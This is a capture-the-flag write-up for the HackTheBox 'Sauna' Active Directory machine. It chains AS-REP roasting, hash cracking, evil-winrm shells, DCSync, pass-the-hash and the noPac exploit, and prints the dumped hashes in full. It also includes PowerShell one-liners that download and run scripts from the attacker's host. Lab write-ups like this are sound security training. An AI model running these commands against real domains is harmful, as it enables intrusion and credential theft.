---
render_with_liquid: false
title: HackTheBox Writeup  Sauna
date: 2023-09-21 23:25:01 +1400
tags: [hackthebox, nmap, windows, ad, crackmapexec, user-enumeration, username-anarchy, kerbrute, asreproast, hashcat, evil-winrm, privesccheck, autologon, invoke-adenum, dcsync, impacket, nopac, oscp-like-2023]
---




# Recon
---
```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ writehosts htb '10.129.95.180 sauna.htb SAUNA SAUNA.EGOTISTICAL-BANK.LOCAL EGOTISTICAL-BANK.LOCAL'
+---------+--------+---------------+------------------------------+
| PROFILE | STATUS |      IP       |            DOMAIN            |
+---------+--------+---------------+------------------------------+
| htb     | on     | 10.129.95.180 | sauna.htb                    |
| htb     | on     | 10.129.95.180 | SAUNA                        |
| htb     | on     | 10.129.95.180 | SAUNA.EGOTISTICAL-BANK.LOCAL |
| htb     | on     | 10.129.95.180 | EGOTISTICAL-BANK.LOCAL       |
+---------+--------+---------------+------------------------------+
```

## Crackmapexec

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ cme smb sauna.htb -u '' -p ''
SMB         sauna.htb       445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         sauna.htb       445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\:
```

## Nmap

```bash

# Nmap 7.94 scan initiated Thu Sep 21 23:25:00 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49685,49692 sauna.htb
Nmap scan report for sauna.htb (10.129.95.180)
Host is up, received user-set (0.11s latency).
Scanned at 2023-09-21 23:25:01 CST for 205s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-09-21 22:25:04Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m51s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 38495/tcp): CLEAN (Timeout)
|   Check 2 (port 39298/tcp): CLEAN (Timeout)
|   Check 3 (port 10224/udp): CLEAN (Timeout)
|   Check 4 (port 19724/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2023-09-21T22:25:55
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Thu Sep 21 23:28:26 2023 -- 1 IP address (1 host up) scanned in 205.64 seconds
```


## 80 - Site : Egotistical Bank


### Info

![](/assets/obsidian/096be221afe642bac0c02af4799b6ce6.png)


# User Flag
---

## Shell as fsmith

### Get valid usernames

Gather potential usernames

![](/assets/obsidian/e12202044f4ad2e847b4d3b971318033.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ cat usernames.txt
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

Generate possible username combinations

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ /opt/sectools/misc/username-anarchy/username-anarchy -i usernames.txt > users.txt

┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ cat users.txt
fergus
fergussmith
fergus.smith
fergussm
fergsmit
...
```

Gather valid usernames

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ /opt/sectools/ad/kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.95.180 users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 09/21/23 - Ronnie Flathers @ropnop

2023/09/21 23:15:24 >  Using KDC(s):
2023/09/21 23:15:24 >   10.129.95.180:88

2023/09/21 23:15:24 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2023/09/21 23:15:29 >  Done! Tested 88 usernames (1 valid) in 5.337 seconds
```

### ASReproasting

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ echo 'fsmith' > ad_users.txt

┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ cme ldap 10.129.95.180 -u ad_users.txt -p '' --asreproast ASREProastables.txt
SMB         10.129.95.180   445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
LDAP        10.129.95.180   445    SAUNA            $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:89fd4a58019cf395e1bbe95c25c07620$2b595bbd050ed72139f87a7a0e01c646b1771b46efaebfd50aa3353e319346856781204533ef8dc9eed1b8c6480bb2c862daa837944c99636eb626828817688152674a67d8979c9803c07cb08ae62927f74d46f1ddae2e8d5fa11b42ca98984164314c074a7beeb6a0a6d8878dbb2a64229c47255753d453e7b01cfef8f37c98cca660e02eb3ce9b516fe6e139c27b36aee0120448a450bfc3551b0a0799526c420e34c5bc2bf5f3491c0c5f2deb8085581c3d977d1f4a19bdb25c60855a8a0b81652260500eefd104f7064a6182e48eab8edbaf7d6950096379d16f8dc7a31b82834b7931eeee5631953254c9deb075bd45830a9b758663bf4272935ec22e4d
```

Crack the hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ hashcat ASREProastables.txt /opt/wordlists/rockyou.txt
```

Cracked

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ hashcat ASREProastables.txt /opt/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

BANK.LOCAL:89fd4a58019cf395e1bbe95c25c07620$2b595bbd050ed72139f87a7a0e01c646b1771b46efaebfd50aa3353e319346856781204533ef8dc9eed1b8c6480bb2c862daa837944c99636eb626828817688152674a67d8979c9803c07cb08ae62927f74d46f1ddae2e8d5fa11b42ca98984164314c074a7beeb6a0a6d8878dbb2a64229c47255753d453e7b01cfef8f37c98cca660e02eb3ce9b516fe6e139c27b36aee0120448a450bfc3551b0a0799526c420e34c5bc2bf5f3491c0c5f2deb8085581c3d977d1f4a19bdb25c60855a8a0b81652260500eefd104f7064a6182e48eab8edbaf7d6950096379d16f8dc7a31b82834b7931eeee5631953254c9deb075bd45830a9b758663bf4272935ec22e4d:Thestrokes23
```


### Evil-Winrm

Validate the creds

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ cme smb sauna.htb -u 'fsmith' -p 'Thestrokes23'
SMB         sauna.htb       445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         sauna.htb       445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23
```

Couldn't smbexec or psexec since it doesn't show `Pwn3d!`

Winrm will do

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ cme winrm sauna.htb -u 'fsmith' -p 'Thestrokes23'
SMB         sauna.htb       5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        sauna.htb       5985   SAUNA            [*] http://sauna.htb:5985/wsman
HTTP        sauna.htb       5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
```

Config `krb5.conf` for **evil-winrm**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ ~/scripts/ad/configure_krb5.py EGOTISTICAL-BANK.LOCAL SAUNA
[*] This script must be run as root
[*] Configuration Data:
[libdefault]
        default_realm = EGOTISTICAL-BANK.LOCAL

[realms]
        EGOTISTICAL-BANK.LOCAL = {
                kdc = sauna.egotistical-bank.local
                admin_server = sauna.egotistical-bank.local
        }

[domain_realm]
        egotistical-bank.local = EGOTISTICAL-BANK.LOCAL
        .egotistical-bank.local = EGOTISTICAL-BANK.LOCAL


[!] Above Configuration will overwrite /etc/krb5.conf, are you sure? [y/N] y
[+] /etc/krb5.conf has been configured
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ evil-winrm -i SAUNA -u fsmith -p 'Thestrokes23'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith

*Evil-WinRM* PS C:\Users\FSmith\Documents> cat ..\Desktop\user.txt
391bc0d5cfe1ebbcab5a1c744bfcc992
```

# Root Flag
---

## Shell as svc_loanmgr

### Windows autologon credentials disclosure

Used [PrivescCheck](https://github.com/itm4n/PrivescCheck) first instead of `winpeas` because it's faster

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> iex (new-object net.webclient).downloadstring("http://10.10.14.14/pwsh/PrivescCheck.ps1"); Invoke-PrivescCheck
```

```bash
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
┃ NAME     ┃ WinLogon credentials                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the 'WinLogon' registry key contains           ┃
┃ clear-text credentials. Note that entries with an empty      ┃
┃ password field are filtered out.                             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
[*] Result: Vulnerable - Medium (1 finding)


Domain   : EGOTISTICALBANK
Username : EGOTISTICALBANK\svc_loanmanager
Password : Moneymakestheworldgoround!
```

Validate the creds, failed

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ cme smb SAUNA -u 'svc_loanmanager' -p 'Moneymakestheworldgoround!'
SMB         SAUNA           445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         SAUNA           445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\svc_loanmanager:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
```

Check users in the ad

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\FSmith\Documents> net user svc_loanmgr
User name                    svc_loanmgr
Full Name                    L Manager
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/24/2020 4:48:31 PM
Password expires             Never
Password changeable          1/25/2020 4:48:31 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

Login with the fixed username : `svc_loanmgr`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ cme winrm SAUNA -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
SMB         SAUNA           5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        SAUNA           5985   SAUNA            [*] http://SAUNA:5985/wsman
HTTP        SAUNA           5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ evil-winrm -i SAUNA -u svc_loanmgr -p 'Moneymakestheworldgoround!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami /all

USER INFORMATION
----------------

User Name                   SID
=========================== ==============================================
egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```


## From svc_loanmgr to Domain Admin


### DCSync

Since I'm too lazy to start up bloodhound in GUI, I'll use [Invoke-ADEnum](https://github.com/Leo4j/Invoke-ADEnum) to automate **powerview**

```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> iex (new-object net.webclient).downloadstring("http://10.10.14.14/pwsh/Invoke-ADEnum_Offline.ps1"); Invoke-ADEnum
```

- `svc_loanmgr` have **DCSync** rights

![](/assets/obsidian/6387491e0098d0411bc017d4eba051ea.png)

Perform **DCsync** to dump hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ secretsdump.py svc_loanmgr:'Moneymakestheworldgoround!'@EGOTISTICAL-BANK.LOCAL
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:367299412ae0b84d72946ee542f46fb0:::
Test$:4601:aad3b435b51404eeaad3b435b51404ee:e52aa7ce3c956dd6cf2ccb3e3c79c096:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:d9a4fefa194a65390dfe8ec183fa96b7d3a94bfd7ccaca423df1fc29061e20fd
SAUNA$:aes128-cts-hmac-sha1-96:6092a09d91686cc5eefe5830251b87ae
SAUNA$:des-cbc-md5:f4e55e15ae020dc4
Test$:aes256-cts-hmac-sha1-96:d4d63797f666e2e039d8aeac9b6a2905f569a45d08ed9d2341af6ab286073732
Test$:aes128-cts-hmac-sha1-96:ad5a88e344386ea27a893231ef19d9fc
Test$:des-cbc-md5:f8265e0da889c794
[*] Cleaning up...
```

### Shell as Administrator

Login as Administrator via **pass the hash**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ evil-winrm -i SAUNA -u Administrator -H '823452073d75b9d1cf70ebdf86c7f98e'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
96bf13112e77f007398f0f33e1b14de5
```

# Additional
---

## Exploit Nopac

> This may break **kerberos authentication**, restart the machine if occurred
{: .prompt-warning }

> Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user

Check if target is vulnerable

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sauna]
└─$ cme smb SAUNA -u 'svc_loanmanager' -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -M nopac
SMB         SAUNA           445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         SAUNA           445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\Test$:Bravosec2023
NOPAC       SAUNA           445    SAUNA            TGT with PAC size 1571
NOPAC       SAUNA           445    SAUNA            TGT without PAC size 798
NOPAC       SAUNA           445    SAUNA
NOPAC       SAUNA           445    SAUNA            VULNERABLE
NOPAC       SAUNA           445    SAUNA            Next step: https://github.com/Ridter/noPac
```

Exploit and dump ntds

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/ad/noPac]
└─$ cd /opt/sectools/ad/noPac

┌──(bravosec㉿fsociety)-[/opt/sectools/ad/noPac]
└─$ python noPac.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!' -dc-ip 10.129.95.180 -dc-host SAUNA --impersonate administrator -dump -use-ldap

███    ██  ██████  ██████   █████   ██████
████   ██ ██    ██ ██   ██ ██   ██ ██
██ ██  ██ ██    ██ ██████  ███████ ██
██  ██ ██ ██    ██ ██      ██   ██ ██
██   ████  ██████  ██      ██   ██  ██████

[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target SAUNA.EGOTISTICAL-BANK.LOCAL
[*] will try to impersonate administrator
[*] Adding Computer Account "WIN-0DFWRZBRTUM$"
[*] MachineAccount "WIN-0DFWRZBRTUM$" password = KT&YKw*hbz^K
[*] Successfully added machine account WIN-0DFWRZBRTUM$ with password KT&YKw*hbz^K.
[*] WIN-0DFWRZBRTUM$ object = CN=WIN-0DFWRZBRTUM,CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
[*] WIN-0DFWRZBRTUM$ sAMAccountName == SAUNA
[*] Saving a DC's ticket in SAUNA.ccache
[*] Reseting the machine account to WIN-0DFWRZBRTUM$
[*] Restored WIN-0DFWRZBRTUM$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*]     Requesting S4U2self
[*] Saving a user's ticket in administrator.ccache
[*] Rename ccache to administrator_SAUNA.EGOTISTICAL-BANK.LOCAL.ccache
[*] Attempting to del a computer with the name: WIN-0DFWRZBRTUM$
[-] Delete computer WIN-0DFWRZBRTUM$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x6d261a4763682dbf58336ec3dc7ff268
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
EGOTISTICALBANK\SAUNA$:plain_password_hex:e119ea93fd20ec73192cdab3f0cf98248a4a4be2c49af94faa0efdf6ef25c8de3197dbf6597154e24504112d7ba485ffbcd0deb53f630e77462d5eaccfab8d8a865da8a7efe3c1785a1df60e3376dc5f78d852f1b8a0d75cc888fddc77209ea530c6dc1834ccb0eff6f4df4cf10971f80ed81bf9b7027b06e8d367a26ee19b851d14635617b16860c82f195edf03de504131eab48d5f1559c26b3eb1bd06f92f3b287de8bbad8eec2334b7a8622ee50faed6c5fd79436cc99114e433ffbb3a5a6514c9bc859060f3c7f5dd14c90213b00bb783cece2ac72fb427afae0a287c893d625bc8594bc3367b62a54f90b5bd9a
EGOTISTICALBANK\SAUNA$:aad3b435b51404eeaad3b435b51404ee:367299412ae0b84d72946ee542f46fb0:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x2460a9de840f81ad5f31efc8b864e55672bd8c44
dpapi_userkey:0x466a52963a9bc1175c7b9109f3cae6bf1b46989e
[*] NL$KM
 0000   87 2B 1B 92 A2 F4 CC 90  DF FF F7 A1 A4 50 61 C3   .+...........Pa.
 0010   4A 11 6B B6 89 3D CD A0  E0 4D 40 61 A2 7F 79 68   J.k..=...M@a..yh
 0020   9C CF BD 0C 8B F2 96 B9  74 42 A0 53 F4 09 32 0A   ........tB.S..2.
 0030   8F 86 0E 5F 5A BD ED 1A  84 0F 66 0E A1 52 BC 7B   ..._Z.....f..R.{
NL$KM:872b1b92a2f4cc90dffff7a1a45061c34a116bb6893dcda0e04d4061a27f79689ccfbd0c8bf296b97442a053f409320a8f860e5f5abded1a840f660ea152bc7b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:367299412ae0b84d72946ee542f46fb0:::
Test$:4601:aad3b435b51404eeaad3b435b51404ee:e52aa7ce3c956dd6cf2ccb3e3c79c096:::
WIN-0DFWRZBRTUM$:4602:aad3b435b51404eeaad3b435b51404ee:edd0fc9441ce7e8a995e390a56a5c3d8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:d9a4fefa194a65390dfe8ec183fa96b7d3a94bfd7ccaca423df1fc29061e20fd
SAUNA$:aes128-cts-hmac-sha1-96:6092a09d91686cc5eefe5830251b87ae
SAUNA$:des-cbc-md5:f4e55e15ae020dc4
Test$:aes256-cts-hmac-sha1-96:d4d63797f666e2e039d8aeac9b6a2905f569a45d08ed9d2341af6ab286073732
Test$:aes128-cts-hmac-sha1-96:ad5a88e344386ea27a893231ef19d9fc
Test$:des-cbc-md5:f8265e0da889c794
WIN-0DFWRZBRTUM$:aes256-cts-hmac-sha1-96:995dbb2150252baafde2e45f33582b6f2f468a487efef09751f63c450a0f2882
WIN-0DFWRZBRTUM$:aes128-cts-hmac-sha1-96:c387dd28101e191597b268454be5a8ee
